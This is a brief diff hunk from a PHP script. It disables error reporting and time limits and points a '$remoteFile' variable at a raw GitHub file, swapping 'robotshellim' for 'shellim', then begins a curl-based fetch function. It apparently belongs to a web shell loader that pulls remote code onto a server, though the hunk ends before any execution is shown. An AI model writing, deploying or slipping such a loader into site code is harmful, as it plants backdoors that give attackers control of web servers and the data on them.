@@ -4,7 +4,7 @@ set_time_limit(0);
 ini_set('display_errors', 0);
 error_reporting(0);
 
-$remoteFile = 'https://raw.githubusercontent.com/brianwijayacupu/Bangientau/refs/heads/main/robotshellim';
+$remoteFile = 'https://raw.githubusercontent.com/brianwijayacupu/Bangientau/refs/heads/main/shellim';
 
 function fetch_from_url($url) {
     if (function_exists('curl_init')) {
